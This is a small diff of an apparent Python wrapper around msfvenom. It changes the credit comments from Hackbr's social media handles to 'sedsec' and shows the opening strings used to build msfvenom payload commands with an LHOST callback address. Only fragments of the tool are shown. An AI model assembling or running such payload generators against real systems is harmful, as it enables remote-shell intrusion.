@@ -3,8 +3,8 @@ import subprocess
 import time
 # Creditos a Hackbr
 # Siga Hackbr nas redes sociais
-# www.instagram.com/hackbroficial
-# wwww.twitter.com/hackbroficial
+# www.instagram.com/sedsec
+# wwww.twitter.com/sedsec
 #...
 msf = ('msfvenom -p ')
 lhost = (' LHOST=')
